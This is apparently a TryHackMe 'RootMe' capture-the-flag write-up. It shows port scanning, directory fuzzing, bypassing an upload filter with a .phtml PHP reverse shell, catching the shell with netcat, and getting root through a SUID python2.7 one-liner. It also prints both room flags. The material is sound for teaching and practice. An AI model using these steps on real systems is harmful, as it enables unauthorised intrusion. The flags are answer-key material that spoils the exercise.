# RootMe

![image.png](RootMe/image.png)

![image.png](RootMe/image%201.png)

![image.png](RootMe/image%202.png)

## Port Scan

Use Rustscan to see all the opening ports

```bash
└─$ rustscan -a rootme.thm --ulimit 5000 -- -A -oN rootme_nmap.log
...
Open xx.xx.xxx.xx:22
Open xx.xx.xxx.xx:80
...

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 8c:36:c9:e9:fc:5a:d9:52:e8:bd:dd:ed:e0:d5:d5:5b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDJxKMIM3vuzpLbL2iTgdjGoa5+CHzcGYLH/aFR+LlJ+pJliEPS1PJUTapsyJ1olBl7lnkk1tt0uo9vue+gba/hc43AYGkYxNW6k48HWdd/b0Q9JnAgEcqLfBYkCeUJsidscTP850y1uEjxnISYvUQkn1h8J6nuMyqbt6vgq0kecvrlqTMYxE8vMQCsmUEgqKdPTsPwNS3V0CmkxH+/QCJvH9cHlLJtHjuRPx4YXl7gypR7fCgPiKPIWRlNZAVHZRdc23tn05EpUrCzfDWIvpadhyp4yEaZa3QR4b7Dp+si455J0YOqqo1ZmNvZOEtYI6FOS+Z8PE8ZUBBTQZ+b/hSujVfc+7zXJGtoyadKhwBQfcN4MqYaHOnQbLC8CdKJQM8dC8kVUA9XaTK8fxhgOhSUo1M6IGhwtX23Il7WW1Mby6ZtnbahZWlYz87imauJy9TZQj0zQK7AZeT8hIAPKfvRK26krtSHgv/h/zExeKtwqgwltHS+RVqEuz1xKYorMI0=
|   256 45:9a:ae:13:31:85:5b:68:5a:9b:1c:bb:9c:89:32:8d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBO041/xqRSrmwwvXlQ8XZhCvz2xuoK1X2tACJqIMBNOFVwEVrHiMQQjVmAsx+MRCjlem2qWH0n3vxlBE0aP+xD0=
|   256 a6:07:ff:93:70:f3:fe:01:d1:86:67:f8:de:ea:c1:2c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAUa6H5ZnLN7His/WVQHmSQVE11FunDWuNWOxH9kiIJ6
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: HackIT - Home
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone
Running (JUST GUESSING): Linux 5.X|6.X|4.X (96%), Google Android 10.X|11.X|12.X (93%)
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:6 cpe:/o:linux:linux_kernel:4 cpe:/o:google:android:10 cpe:/o:google:android:11 cpe:/o:google:android:12 cpe:/o:linux:linux_kernel:5.4
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 5.14 - 6.8 (96%), Linux 4.15 - 5.19 (96%), Linux 4.15 (96%), Linux 5.4 - 5.15 (96%), Android 10 - 12 (Linux 4.14 - 4.19) (93%), Android 10 - 11 (Linux 4.9 - 4.14) (92%), Android 12 (Linux 5.4) (92%), Android 9 - 11 (Linux 4.9 - 4.14) (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%)
No exact OS matches for host (test conditions non-ideal).
```

There are `2` opening ports, they are 

- Port 22: SSH (OpenSSH 8.2p1)
- Port 80: HTTP (`Apache httpd 2.4.41`)

## HTTP Web Enumeration

When we arrive to the HTTP webpage, we can see ‘Can you root me?’

![image.png](RootMe/image%203.png)

Use FFUF to discover hidden directories and endpoints

```bash
└─$ ffuf -u http://rootme.thm/FUZZ -w /usr/share/wordlists/dirb/common.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://rootme.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 110ms]
                        [Status: 200, Size: 616, Words: 115, Lines: 26, Duration: 111ms]
.hta                    [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 896ms]
.htpasswd               [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 4909ms]
css                     [Status: 301, Size: 306, Words: 20, Lines: 10, Duration: 101ms]
index.php               [Status: 200, Size: 616, Words: 115, Lines: 26, Duration: 98ms]
js                      [Status: 301, Size: 305, Words: 20, Lines: 10, Duration: 98ms]
panel                   [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 100ms]
server-status           [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 99ms]
uploads                 [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 100ms]
:: Progress: [4614/4614] :: Job [1/1] :: 392 req/sec :: Duration: [0:00:15] :: Errors: 0 ::

```

There is a `panel` and a `uploads` endpoint

## File Upload Vulnerability

The `panel` endpoint allows us to upload files

![image.png](RootMe/image%204.png)

While the `uploads` endpoint stores the files

![image.png](RootMe/image%205.png)

We can try to upload a PHP [reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), but we will find it is rejected.

![image.png](RootMe/image%206.png)

However, if we change the extension to `.phtml`, it gladly accepts it.

![image.png](RootMe/image%207.png)

It seems that the web only black list `.php` extension and now we can see our reverse shell in the `upload` directory.

![image.png](RootMe/image%208.png)

## Reverse Shell

With this, we can establish a reverse shell connection.

```bash
└─$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [xxx.xxx.xxx.xx] from (UNKNOWN) [xx.xx.xxx.xx] 39412
Linux ip-10-48-150-32 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 12:44:10 up 11 min,  0 users,  load average: 0.00, 0.09, 0.11
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ pwd
/
```

Now we can get the user flag.

```bash
$ cd /home
$ ls
rootme
test
ubuntu
$ cd rootme
$ ls
$ cd ..
$ cd test
$ ls
$ cd 
$ cd ..                                                                                                                                                                                                                                     
$ cd ubuntu                                                                                                                                                                                                                                 
$ ls                                                                                                                                                                                                                                        
$ find . -type f -name user.txt 2> /dev/null
./var/www/user.txt
$ cat ./var/www/user.txt
THM{y0u_g0t_a_sh3ll}
```

User flag: `THM{y0u_g0t_a_sh3ll}`

## Privilege Escalation

In the above, we found three users, but they seem to have nothing to exploit.

And because we don’t know the password for `www-data`, we can’t check `sudo` privileges.

So all we can do is see if any weird binaries have SUID set.

```bash
bash-5.0$ find . -type f -perm -04000 2> /dev/null
find . -type f -perm -04000 2> /dev/null
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/snapd/snap-confine
./usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
./usr/lib/eject/dmcrypt-get-device
./usr/lib/openssh/ssh-keysign
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/bin/newuidmap
./usr/bin/newgidmap
./usr/bin/chsh
./usr/bin/python2.7
./usr/bin/at
./usr/bin/chfn
./usr/bin/gpasswd
./usr/bin/sudo
./usr/bin/newgrp
./usr/bin/passwd
./usr/bin/pkexec
./snap/core/8268/bin/mount
./snap/core/8268/bin/ping
./snap/core/8268/bin/ping6
./snap/core/8268/bin/su
./snap/core/8268/bin/umount
./snap/core/8268/usr/bin/chfn
./snap/core/8268/usr/bin/chsh
./snap/core/8268/usr/bin/gpasswd
./snap/core/8268/usr/bin/newgrp
./snap/core/8268/usr/bin/passwd
./snap/core/8268/usr/bin/sudo
./snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
./snap/core/8268/usr/lib/openssh/ssh-keysign
./snap/core/8268/usr/lib/snapd/snap-confine
./snap/core/8268/usr/sbin/pppd
./snap/core/9665/bin/mount
./snap/core/9665/bin/ping
./snap/core/9665/bin/ping6
./snap/core/9665/bin/su
./snap/core/9665/bin/umount
./snap/core/9665/usr/bin/chfn
./snap/core/9665/usr/bin/chsh
./snap/core/9665/usr/bin/gpasswd
./snap/core/9665/usr/bin/newgrp
./snap/core/9665/usr/bin/passwd
./snap/core/9665/usr/bin/sudo
./snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
./snap/core/9665/usr/lib/openssh/ssh-keysign
./snap/core/9665/usr/lib/snapd/snap-confine
./snap/core/9665/usr/sbin/pppd
./snap/core20/2599/usr/bin/chfn
./snap/core20/2599/usr/bin/chsh
./snap/core20/2599/usr/bin/gpasswd
./snap/core20/2599/usr/bin/mount
./snap/core20/2599/usr/bin/newgrp
./snap/core20/2599/usr/bin/passwd
./snap/core20/2599/usr/bin/su
./snap/core20/2599/usr/bin/sudo
./snap/core20/2599/usr/bin/umount
./snap/core20/2599/usr/lib/dbus-1.0/dbus-daemon-launch-helper
./snap/core20/2599/usr/lib/openssh/ssh-keysign
./bin/mount
./bin/su
./bin/fusermount
./bin/umount

```

We can see Python 2.7 has SUID set, which can be exploited according to [GTFOBins](https://gtfobins.org/gtfobins/python/)

Now we can get the root flag.

```bash
bash-5.0$ ./usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
./usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# id
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
# cd /root
cd /root
# ls
ls
root.txt  snap
# cat root.txt
cat root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```

Root Flag: `THM{pr1v1l3g3_3sc4l4t10n}`